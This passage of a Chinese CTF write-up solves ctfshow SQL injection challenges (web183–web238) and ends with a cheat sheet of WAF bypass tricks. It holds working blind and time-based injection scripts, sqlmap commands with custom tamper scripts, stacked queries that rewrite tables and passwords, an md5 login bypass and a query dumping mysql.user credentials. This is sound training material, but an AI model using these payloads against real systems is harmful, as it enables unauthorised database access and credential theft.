            'tableName': f"(ctfshow_user)where(substr(pass,{i},1))regexp('{j}')"
        }
        r = requests.post(url, data=data)
        if r.text.find("$user_count = 1;") > 0:
            res += j
            print(res)
            break
```

## web184*

### 题目

查询语句

```
//拼接sql语句查找指定ID用户
  $sql = "select count(*) from ".$_POST['tableName'].";";    
```

返回逻辑

```
//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i', $str);
  }     
```

查询结果

```
//返回用户表的记录总数
      $user_count = 0;    
```

### 思路

flag 的值第一位是 c ，查询结果过为 43

```
tableName=ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,1,1)regexp(char(99)))
```

<img src="图片\Snipaste_2023-01-25_11-30-08.png" alt="Snipaste_2023-01-25_11-30-08" style="zoom:67%;" />

脚本， right join ctfshow_user 是 join 自己  https://blog.csdn.net/i1sfish/article/details/112647421

```python
# @Author:Y4tacker
import requests
# ctfshow{4564e82f-cbd3-446f-bf1e-35d6d6919aa3}
url = "http://b9e1166d-287f-484a-acbc-9f8c6152d20f.challenge.ctf.show/select-waf.php"

flag = 'ctfshow'
for i in range(45):
    if i <= 7:
        continue
    for  j in range(127):
        data = {
            "tableName": f"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{i},1)regexp(char({j})))"  # substr(b.pass,8,1) 是 {
        }
        r = requests.post(url,data=data)
        if r.text.find("$user_count = 43;")>0:
            if chr(j) != ".":
                flag += chr(j)
                print(flag.lower())
                if chr(j) == "}":
                    exit(0)
                break
```

## web185*

### 题目

返回逻辑，这个比上题多过滤了数字

```php
//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i', $str);
  }
```

### 思路

我们可以把数字转换成其它

```
传入 true 时为 1
传入 true+true 时为 2
传入 true+true+true 时为 3
```

<img src="图片\20201127190309995.png" alt="20201127190309995" style="zoom:67%;" />

```python
# @Author:Y4tacker
import requests

url = "http://341e93e1-a1e7-446a-b7fc-75beb0e88086.chall.ctf.show/select-waf.php"
flag = 'ctfshow{'
def createNum(n):
    num = 'true'
    if n == 1:
        return 'true'
    else:
        for i in range(n - 1):
            num += "+true"
    return num

for i in range(45):
    if i <= 7:
        continue
    for j in range(127):
        data = {
            "tableName": f"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{createNum(i)},{createNum(1)})regexp(char({createNum(j)})))"
        }
        r = requests.post(url, data=data)
        if r.text.find("$user_count = 43;") > 0:
            if chr(j) != ".":
                flag += chr(j)

                print(flag.lower())
                if chr(j) == "}":
                    exit(0)
                break
```

## web186*

与上题类似

```python
# @Author:Y4tacker
import requests

url = "http://ed2c10ec-c4af-4131-aa74-8437c380e547.challenge.ctf.show/select-waf.php"
flag = 'ctfshow'
def createNum(n):
    num = 'true'
    if n == 1:
        return 'true'
    else:
        for i in range(n - 1):
            num += "+true"
    return num

for i in range(45):
    if i <= 7:
        continue
    for j in range(127):
        data = {
            "tableName": f"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{createNum(i)},{createNum(1)})regexp(char({createNum(j)})))"
        }
        r = requests.post(url, data=data)
        if r.text.find("$user_count = 43;") > 0:
            if chr(j) != ".":
                flag += chr(j)

                print(flag.lower())
                if chr(j) == "}":
                    exit(0)
                break
```

## web187

### 题目

查询语句

```
//拼接sql语句查找指定ID用户
  $sql = "select count(*) from ctfshow_user where username = '$username' and password= '$password'";
      
```

返回逻辑

```
    $username = $_POST['username'];
    $password = md5($_POST['password'],true);

    //只有admin可 以获得flag
    if($username!='admin'){
        $ret['msg']='用户名不存在';
        die(json_encode($ret));
    }
```

<img src="图片\Snipaste_2023-01-25_12-48-21.png" alt="Snipaste_2023-01-25_12-48-21" style="zoom:80%;" />

### 思路

将密码转换成16进制的hex值以后，再将其转换成字符串后包含’ ‘or ’ 6’

```
 ffifdyop
 129581926211651571912466741651878684928
```

当我们看看 md5( "ffifdyop",true) 的结果

```
<?php
echo md5( "ffifdyop",true);
?>
```

```
'or'6ɝ驡r,魢
```

带入到 sql 语句，'or'6 直接会输出所有的 count(*)

```
$sql = "select count(*) from ctfshow_user where username = '$username' and password= ''or'6ɝ驡r,魢'";
```

## web188

### 题目

查询语句

```
  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = {$username}";
      
```

返回逻辑

```php
  //用户名检测
  if(preg_match('/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\'|\"/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }
  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }
  //密码判断
  if($row['pass']==intval($password)){
      $ret['msg']='登陆成功';
      array_push($ret['data'], array('flag'=>$flag));
    }      
```

### 思路

$row['pass']==intval($pass word) 为**弱类型比较**

当 sql 语句里没用引号包裹时，是数字类型 

```
select pass from ctfshow_user where username = {$username}
```

`SELECT * FROM kk where username = 1<1 and password = 0`
太高雅了为什么这样就可以查到所有数据
这是弱比较：字符串会转为0 ，所以0=0永远成立

<img src="图片\Snipaste_2023-01-25_14-30-30.png" alt="Snipaste_2023-01-25_14-30-30" style="zoom:80%;" />

拓展:牛逼
`SELECT * FROM kk where username = 'aaa' and password = 12`
查出`username=aaa password=12sasad`

<img src="图片\Snipaste_2023-01-25_14-06-44.png" alt="Snipaste_2023-01-25_14-06-44" style="zoom:67%;" />

## web189*

### 题目

flag 在  api/index.php 文件中

查询语句

```
  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = {$username}";   
```

返回逻辑

```
  //用户名检测
  if(preg_match('/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }
  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }
  //密码判断
  if($row['pass']==$password){
      $ret['msg']='登陆成功';
    }
```

### 思路

读数据 load_file()

```python
# Author：Y4tacker
import requests

url = "http://a1430f6e-9b7d-4a1d-a49a-597cabb6f356.challenge.ctf.show/api/"


def getFlagIndex():
    head = 1
    tail = 300
    while head < tail:
        mid = (head + tail) >> 1
        data = {
            'username': "if(locate('ctfshow{'," + "load_file('/var/www/html/api/index.php'))>{0},0,1)".format(str(mid)),
            'password': '1'
        }
        r = requests.post(url, data=data)
        if "密码错误" == r.json()['msg']:
            head = mid + 1
        else:
            tail = mid
    return mid


def getFlag(num):
    i = int(num)
    result = ""
    while 1:
        head = 32
        tail = 127

        i = i + 1
        while head < tail:
            mid = (head + tail) >> 1
            data = {
                'username': "if(ascii(substr(load_file('/var/www/html/api/index.php'),{0},1))>{1},0,1)".format(str(i),
                                                                                                               str(
                                                                                                                   mid)),
                'password': '1'
            }
            r = requests.post(url, data=data)
            if "密码错误" == r.json()['msg']:
                head = mid + 1
            else:
                tail = mid
            mid += 1
        if head != 32:
            result += chr(head)
            print(result)
        else:
            break

if __name__ == '__main__':
    index = getFlagIndex()
    getFlag(index)
```

### 重要函数

#### locate() 函数 

 https://blog.csdn.net/hello_world_9664/article/details/124159818

<img src="图片\Snipaste_2023-01-25_16-43-59.png" alt="Snipaste_2023-01-25_16-43-59" style="zoom:80%;" />

#### load_file() 函数

https://www.cnblogs.com/qianxinggz/p/13280788.html

https://cloud.tencent.com/developer/article/1918345

## web190*

盲注

```python
# @Author:Y4tacker
import requests

url = "http://1141d804-9789-4a7e-879d-95f078eb1c10.challenge.ctf.show/api/"

result = ""
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        # 查数据库
        # payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
        # 查字段
        # payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"
        # 查flag
        payload = "select group_concat(f1ag) from ctfshow_fl0g"
        data = {
            'username': f"admin' and if(ascii(substr(({payload}),{i},1))>{mid},1,2)='1",
            'password': '1'
        }

        r = requests.post(url,data=data)
        if "密码错误"  == r.json()['msg']:
            head = mid + 1
        else:
            tail = mid

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
```

## web191*

ord() 函数

<img src="图片\Snipaste_2023-01-25_16-36-46.png" alt="Snipaste_2023-01-25_16-36-46" style="zoom:80%;" />

```python
# @Author:Y4tacker
import requests

url = "http://c2ebf0f6-e291-40cc-a7c4-779e36f8e694.challenge.ctf.show/api/"

result = ""
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        # 查数据库
        # payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
        # 查字段
        # payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"
        # 查flag
        payload = "select group_concat(f1ag) from ctfshow_fl0g"
        data = {
            # 'username': f"admin' and if(ascii(substr(({payload}),{i},1))>{mid},1,2)='1",  # web190
            'username': f"admin' and if(ord(substr(({payload}),{i},1))>{mid},1,2)='1",     # web191
            'password': '1'
        }

        r = requests.post(url,data=data)
        if "密码错误"  == r.json()['msg']:
            head = mid + 1
        else:
            tail = mid

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
```

## web192*

查询语句

```
  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = '{$username}'";
```

增加了一些过滤

```
//TODO:感觉少了个啥，奇怪
    if(preg_match('/file|into|ascii|ord|hex/i', $username)){
        $ret['msg']='用户名非法';
        die(json_encode($ret));
    }
```

```python
# @Author:Y4tacker
import requests
import string

url = "http://e50b9d8e-c3f8-4ab6-b0a7-07c474082d06.challenge.ctf.show/api/"
flagstr=" _{}-" + string.ascii_lowercase + string.digits
flag = ''
for i in range(1,45):
    for j in flagstr:
        payload = f"admin' and if(substr((select group_concat(f1ag) from ctfshow_fl0g),{i},1)regexp('{j}'),1,2)='1"
        data = {
            'username': payload,
            'password': '1'
        }
        r = requests.post(url, data=data)
        if "密码错误" == r.json()['msg']:
            flag += j
            print(flag)
            if "}" == j:
                exit(0)
            break
```

regexp() 函数是正则匹配

## web193*

使用模糊查询

```python
# @Author:Y4tacker
import requests
# 应该还可以用instr等函数，LOCATE、POSITION、INSTR、FIND_IN_SET、IN、LIKE
url = "http://9f9cf77b-6342-49a0-9815-3f26261aeb12.challenge.ctf.show/api/"
final = ""
stttr = "flag{}-_1234567890qwertyuiopsdhjkzxcvbnm"
for i in range(1,45):
    for j in stttr:
        final += j
        # 查表名-ctfshow_flxg
        # payload = f"admin' and if(locate('{final}',(select table_name from information_schema.tables where table_schema=database() limit 0,1))=1,1,2)='1"
        # 查字段-f1ag
        # payload = f"admin' and if(locate('{final}',(select column_name from information_schema.columns where table_name='ctfshow_flxg' limit 1,1))=1,1,2)='1"
        payload = f"admin' and if(locate('{final}',(select f1ag from ctfshow_flxg limit 0,1))=1,1,2)='1"
        data = {
            'username': payload,
            'password': '1'
        }
        r = requests.post(url,data=data)
        if "密码错误" == r.json()['msg']:
            print(final)
        else:
            final = final[:-1]
```

```
Locate(str,sub) > 0，表示sub字符串包含str字符串

Locate(str,sub) = 0，表示sub字符串不包含str字符串
```

**mysql的instr函数有着相似的功能，instr(str,sub)返回的是字符串sub在字符串str第一次出现的位置，其中instr(str,sub) = 0 表示字符串str不包含字符串sub**

```
select * from stu s where s.name like concat('%',#{name},'%') ;
 
select * from stu s where instr(s.name,#{name}) > 0;
 
select * from stu s where locate(#{name},s.name) > 0;
```

## web194

与上一题一样

## web195

堆叠注入

```
//拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = {$username};";
      
```

```
  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }
  //密码判断
  if($row['pass']==$password){
      $ret['msg']='登陆成功';
    }
  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
  if(preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }
  if($row[0]==$password){
      $ret['msg']="登陆成功 flag is $flag";
  }
```

```
payload="0x61646d696e;update`ctfshow_user`set`pass`=0x313131;"
# 至于为什么非得用十六进制登录，是因为下面这个没有字符串单引号包围
sql = "select pass from ctfshow_user where username = {$username};";
```

##    web196

```
0;select(1);
1
```

## web197~198

堆叠注入

通过把密码列与id互换之后爆破密码

```python
# @Author:Y4tacker
import requests

url = "http://b126bc7c-2b32-461d-9520-30d5baf7a152.chall.ctf.show/api/"
for i in range(100):
    if i == 0:
        data = {
            'username': '0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user '
                        'change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` '
                        'varchar(255);',
            'password': f'{i}'
        }
        r = requests.post(url, data=data)
    data = {
        'username': '0x61646d696e',
        'password': f'{i}'
    }
    r = requests.post(url, data=data)
    if "登陆成功" in r.json()['msg']:
        print(r.json()['msg'])
        break
```

## web199~200

```
  //查询语句
  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = {$username};";
```

```
# @Author:Y4tacker
# username=0;show tables;
# pass=ctfshow_user
```

## web201（sqlmap）

练习使用  sqlmap

使用**--user-agent 指定agent**

 使用**--referer 绕过referer检查**

```
/拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."';";
```

判断注入点 ctfshow_web 

```
python sqlmap.py -u "http://11ba3515-686f-4024-b408-b64f2385b828.challenge.ctf.show/api/?id=1" --referer="ctf.show"
```

查数据表   ctfshow_user

```
python sqlmap.py -u "http://11ba3515-686f-4024-b408-b64f2385b828.challenge.ctf.show/api/?id=1" --referer="ctf.show" -D "ctfshow_web" --tables
```

查列

```
python sqlmap.py -u "http://11ba3515-686f-4024-b408-b64f2385b828.challenge.ctf.show/api/?id=1" --referer="ctf.show" -D "ctfshow_web" -T "ctfshow_user" --columns
```

查数据

```
python sqlmap.py -u "http://11ba3515-686f-4024-b408-b64f2385b828.challenge.ctf.show/api/?id=1" --referer="ctf.show" -D "ctfshow_web" -T "ctfshow_user" -C "pass" --dump
```

## web202

查询语句，**使用--data 调整sqlmap的请求方式**

```
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."';";
```

```
第一步用--data调整参数
python sqlmap.py -u "http://31bb058b-6d7f-4cf3-b3d8-8f38c707dd18.challenge.ctf.show/api/" --referer="ctf.show" --data="id=1"
第二步
python sqlmap.py -u "http://31bb058b-6d7f-4cf3-b3d8-8f38c707dd18.challenge.ctf.show/api/" --referer="ctf.show" --data="id=1" --dbs
第三步
python sqlmap.py -u "http://31bb058b-6d7f-4cf3-b3d8-8f38c707dd18.challenge.ctf.show/api/" --referer="ctf.show" --data="id=1" -D "ctfshow_web" --tables
第四步
python sqlmap.py -u "http://31bb058b-6d7f-4cf3-b3d8-8f38c707dd18.challenge.ctf.show/api/" --referer="ctf.show" --data="id=1" -D "ctfshow_web" -T "ctfshow_user" --columns
第五步
python sqlmap.py -u "http://31bb058b-6d7f-4cf3-b3d8-8f38c707dd18.challenge.ctf.show/api/" --referer="ctf.show" --data="id=1" -D "ctfshow_web" -T "ctfshow_user" -C "pass" --dump
```

## web203

**使用--method 调整sqlmap的请求方式**

注意：一定要加上–headers=“Content-Type: text/plain” ，否则是按表单提交的，put接收不到

查询语句

```
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."';";
```

```
python sqlmap.py -u "http://1e630c1e-68d5-4652-96b0-be8ecde76a47.challenge.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --dbms=mysql -D ctfshow_web -T ctfshow_user -C pass --dump
```

## web204

**使用--cookie 提交cookie数据**

```
python sqlmap.py -u http://c400044e-d654-4dce-9ce9-49001bbf89ae.challenge.ctf.show/api/index.php --method=PUT --data="id=1" --referer=ctf.show  --dbms=mysql dbs=ctfshow_web -T ctfshow_user -C pass --dump --headers="Content-Type: text/plain" --cookie="PHPSESSID=i904phgqrouqf3k3bdlk5umbvf; ctfshow=917ef11aea06aaf3f03b1ae2c3f42b0b"
```

## web205

**api调用需要鉴权**

调用查询语句前会先访问 getToken.php

<img src="图片\Snipaste_2023-01-27_09-35-55.png" alt="Snipaste_2023-01-27_09-35-55" style="zoom:80%;" />

```
--safe-url 设置在测试目标地址前访问的安全链接
 --safe-freq 设置两次注入测试前访问安全链接的次数
```

```
python sqlmap.py -u http://http://10804c30-dc22-4755-ac8b-c1871f9119e4.challenge.ctf.show//api/index.php --method=PUT --data="id=1" --referer=ctf.show --dbms=mysql dbs=ctfshow_web -T ctfshow_flax -C flagx --dump  --headers="Content-Type: text/plain" --safe-url=http://d83f7140-791a-418f-bccc-2304b453c40b.challenge.ctf.show/api/getToken.php --safe-freq=1
```

## web206

```
python sqlmap.py -u http://10804c30-dc22-4755-ac8b-c1871f9119e4.challenge.ctf.show/api/index.php --method=PUT --data="id=1" --referer=ctf.show --dbms=mysql -D "ctfshow_web" -T "ctfshow_flaxc" -C "flagv" --dump  --headers="Content-Type: text/plain" --safe-url=http://10804c30-dc22-4755-ac8b-c1871f9119e4.challenge.ctf.show/api/getToken.php --safe-freq=1
```

## web207

数据库 ctfshow_web

```
python sqlmap.py -u "http://10804c30-dc22-4755-ac8b-c1871f9119e4.challenge.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url="http://10804c30-dc22-4755-ac8b-c1871f9119e4.challenge.ctf.show/api/getToken.php" --safe-freq=1 --current-db --dump --batch --prefix="')" --suffix="#" --tamper=space2comment --cookie="PHPSESSID=c46vj2ddfk2o30k3a9ae4ennkq;"
```

表 ctfshow_user

```
python sqlmap.py -u "http://10804c30-dc22-4755-ac8b-c1871f9119e4.challenge.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url="http://10804c30-dc22-4755-ac8b-c1871f9119e4.challenge.ctf.show/api/getToken.php" --safe-freq=1 -D "ctfshow_web" --tables --dump --batch --prefix="')" --suffix="#" --tamper=space2comment --cookie="PHPSESSID=c46vj2ddfk2o30k3a9ae4ennkq;"
```

列

```
python sqlmap.py -u "http://10804c30-dc22-4755-ac8b-c1871f9119e4.challenge.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url="http://10804c30-dc22-4755-ac8b-c1871f9119e4.challenge.ctf.show/api/getToken.php" --safe-freq=1 -D "ctfshow_web" -T "ctfshow_flaxc" --dump  --prefix="')"  --tamper=space2comment --cookie="PHPSESSID=c46vj2ddfk2o30k3a9ae4ennkq;" 
```

## web208

```
python sqlmap.py -u "http://332e19fd-efb2-4dc9-a720-be35e1701678.challenge.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url="http://332e19fd-efb2-4dc9-a720-be35e1701678.challenge.ctf.show/api/getToken.php" --safe-freq=1 -D "ctfshow_web" --tables --dump --batch --prefix="')" --suffix="#" --tamper=space2comment --cookie="PHPSESSID=g707724qb2gpqktj9kqrrbcvpm;"
```

## web209

这里是 sqlmap 的自带 tamper space2commmon.py

```python
#!/usr/bin/env python
from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces space character (' ') with comments '/**/'

    Tested against:
        * Microsoft SQL Server 2005
        * MySQL 4, 5.0 and 5.5
        * Oracle 10g
        * PostgreSQL 8.3, 8.4, 9.0

    Notes:
        * Useful to bypass weak and bespoke web application firewalls

    >>> tamper('SELECT id FROM users')
    'SELECT/**/id/**/FROM/**/users'
    """

    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += "/**/"
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == " " and not doublequote and not quote:
                retVal += "/**/"
                continue

            retVal += payload[i]
   
   return retVal
```

y4 写的 tamper ，  `=`这里用`like`绕过

```python
#!/usr/bin/env python
"""
Author:Y4tacker
"""

from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW


def tamper(payload, **kwargs):
    payload = space2comment(payload)
    return payload


def space2comment(payload):
    retVal = payload
    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += chr(0x0a)
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == "*":
                retVal += chr(0x31)
                continue

            elif payload[i] == "=":
                retVal += chr(0x0a)+'like'+chr(0x0a)
                continue

            elif payload[i] == " " and not doublequote and not quote:
                retVal += chr(0x0a)
                continue

            retVal += payload[i]

    return retVal
```

```
python sqlmap.py -u "http://d4e8e3e5-1f91-4fc0-8b8a-81945b1a5694.challenge.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url="http://d4e8e3e5-1f91-4fc0-8b8a-81945b1a5694.challenge.ctf.show/api/getToken.php" --safe-freq=1 -D "ctfshow_web" --tables --dump --batch --tamper=web209 --cookie="PHPSESSID=32seormjubd2f34upena24osd3;"
```

## web210-212

```
//对查询字符进行解密
  function decode($id){
    return strrev(base64_decode(strrev(base64_decode($id))));
  }
```

```python
#!/usr/bin/env python
"""
Author:Y4tacker
"""

from lib.core.compat import xrange
from lib.core.enums import PRIORITY
import base64
__priority__ = PRIORITY.LOW


def tamper(payload, **kwargs):
    payload = space2comment(payload)
    retVal = ""
    if payload:
        retVal = base64.b64encode(payload[::-1].encode('utf-8'))
        retVal = base64.b64encode(retVal[::-1]).decode('utf-8')
    return retVal

def space2comment(payload):
    retVal = payload
    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += chr(0x0a)
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == "*":
                retVal += chr(0x31)
                continue

            elif payload[i] == "=":
                retVal += chr(0x0a)+'like'+chr(0x0a)
                continue

            elif payload[i] == " " and not doublequote and not quote:
                retVal += chr(0x0a)
                continue

            retVal += payload[i]

    return retVal
```

```
python sqlmap.py -u "http://12423848-f790-499a-b77b-c31bcecc030e.challenge.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url="http://12423848-f790-499a-b77b-c31bcecc030e.challenge.ctf.show/api/getToken.php" --safe-freq=1 -D "ctfshow_web" --tables --dump --batch --tamper=web210 --cookie="PHPSESSID=kaikof5mgg1359cupm8m110e0d;"
```

## web234

web234
很遗憾单引号被过滤了，但是巅峰极客刚刚考过，用\实现逃逸
原来的语句是
$sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";
但是传入单引号后
$sql = "update ctfshow_user set pass = '\' where username = 'username';";
这样pass里面的内容就是' where username =,接下来username里面的参数就是可以控制的了

```
考点:\实现逃逸
```

```
# username=,username=(select group_concat(table_name) from information_schema.columns where table_schema=database())-- - &password=\

# username=,username=(select group_concat(column_name) from information_schema.columns where table_name=0x666c6167323361)-- - &password=\

# username=,username=(select flagass23s3 from flag23a)-- - &password=\
```

## web214*

时间盲注

```python
"""
Author:Y4tacker
"""
import requests

url = "http://d23ee9e9-3e43-4b0a-b172-547561ea456d.chall.ctf.show/api/"

result = ""
i = 0
while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        # 查数据库
        # payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
        # 查列名字-id.flag
        # payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagx'"
        # 查数据
        payload = "select flaga from ctfshow_flagx"
        data = {
            'ip': f"if(ascii(substr(({payload}),{i},1))>{mid},sleep(1),1)",
            'debug':'0'
        }
        try:
            r = requests.post(url, data=data, timeout=1)
            tail = mid
        except Exception as e:
            head = mid + 1

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
```

## web215*

时间盲注

```python
"""
Author:Y4tacker
"""
import requests

url = "http://4ba8a766-0fda-4c66-bdbc-0e3f0a9d57dc.chall.ctf.show/api/"

result = ""
i = 0
while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        # 查数据库
        # payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
        # 查列名字-id.flag
        # payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'"
        # 查数据
        payload = "select flagaa from ctfshow_flagxc"
        data = {
            'ip': f"1' or if(ascii(substr(({payload}),{i},1))>{mid},sleep(1),1) and '1'='1",
            'debug':'0'
        }
        try:
            r = requests.post(url, data=data, timeout=1)
            tail = mid
        except Exception as e:
            head = mid + 1

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
```

## web238

一个简单 crud 的页面

<img src="图片\Snipaste_2023-01-28_11-09-55.png" alt="Snipaste_2023-01-28_11-09-55" style="zoom: 80%;" />

insert 语句，闭合 sql ，插入我们想要的数据，一般配合查询功能就可以查出来

```
//插入数据
  $sql = "insert into ctfshow_user(username,pass) value('{$username}','{$password}');";    
```

```
"""
Author:Y4tacker
"""
# username=3',(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())));#&password=1
# username=3',(select(group_concat(column_name))from(information_schema.columns)where(table_name='flagb')));#&password=1
# username=3',(select(flag)from(flagb)));#&password=1
```

插入后的 sql 为

```
  $sql = "insert into ctfshow_user(username,pass) value('3',(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())));#','1');"; 
```

## web235

过滤`or '`因此information表也不能用了
考虑其他表`sys`也没有   https://zhuanlan.zhihu.com/p/98206699

```
"""
Author:Y4tacker
"""
# username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())-- - &password=\
# username=,username=(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a)-- - &password=\
或者一样的没区别只是如果没过率数字可以这样玩
# username=,username=(select `2` from(select 1,2,3 union select * from flag23a1 limit 1,1)a)-- - &password=\

```

# 绕过

## 空格字符绕过

两个空格代替一个空格，用 Tab 代替空格，%a0=空格

```
%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/
```

```
select * from users where id=1 /*!union*//*!select*/1,2,3,4;
```

```
%09 TAB 键（水平）
%0a 新建一行
%0c 新的一页
%0d return 功能
%0b TAB 键（垂直）
%a0 空格
```

```
可以将空格字符替换成注释 /**/ 还可以使用 /*!这里的根据 mysql 版本的内容不注释*/
```

## 大小写绕过

将字符串设置为大小写，例如 and 1=1 转成 AND 1=1 AnD 1=1

## 浮点数绕过

```
select * from users where id=8E0union select 1,2,3,4;
select * from users where id=8.0union select 1,2,3,4;
```

<img src="图片\Snipaste_2023-02-01_16-15-47.png" alt="Snipaste_2023-02-01_16-15-47" style="zoom:80%;" />

## NULL 值绕过

select \N; 代表 null

<img src="图片\Snipaste_2023-02-01_16-16-38.png" alt="Snipaste_2023-02-01_16-16-38" style="zoom:80%;" />

```
select * from users where id=\Nunion select 1,2,3,\N;
select * from users where id=\Nunion select 1,2,3,\Nfrom users;
```

<img src="图片\Snipaste_2023-02-01_16-18-08.png" alt="Snipaste_2023-02-01_16-18-08" style="zoom:80%;" />

## 引号绕过

如果 waf 拦截过滤单引号的时候，可以使用双引号 在 mysql 里也可以用双引号作为字符串

```
select * from users where id='1'; 
select * from users where id="1";
```

<img src="图片\Snipaste_2023-02-01_16-18-58.png" alt="Snipaste_2023-02-01_16-18-58"  />

也可以将字符串转换成 16 进制 再进行查询

```
select hex('admin');
select * from users where username='admin'; 
select * from users where username=0x61646D696E;
```

<img src="图片\Snipaste_2023-02-01_23-08-16.png" alt="Snipaste_2023-02-01_23-08-16" style="zoom:80%;" />

如果 gpc 开启了，但是**注入点是整形时**，也可以用 hex 十六进制进行绕过 

```
select * from users where id=-1 union select 1,2,(select group_concat(column_name) from information_schema.columns where TABLE_NAME='users' limit 1),4; 

select * from users where id=-1 union select 1,2,(select group_concat(column_name) from information_schema.columns where TABLE_NAME=0x7573657273 limit 1),4; 
```

可以看到存在整型注入的时候，没有用到单引号，所以可以注入

<img src="图片\Snipaste_2023-02-01_23-12-53.png" alt="Snipaste_2023-02-01_23-12-53" style="zoom:80%;" />

可以看到可以把列 usrs 的字段全部查询出来

## 添加库名绕过

以下两条查询语句，执行的结果是一致的，但是有些 waf 的拦截规则 并不会拦截[库名].[表名]这种模式

```
select * from users where id=-1 union select 1,2,3,4 from users; 
select * from users where id=-1 union select 1,2,3,4 from moonsec.users;
```

<img src="图片\Snipaste_2023-02-01_23-17-04.png" alt="Snipaste_2023-02-01_23-17-04" style="zoom:67%;" />

mysql 中也可以添加库名查询表。例如跨库查询 mysql 库里的 usrs 表的内容

```
select * from users where id=-1 union select 1,2,3,concat(user,authentication_string) from mysql.user;
```

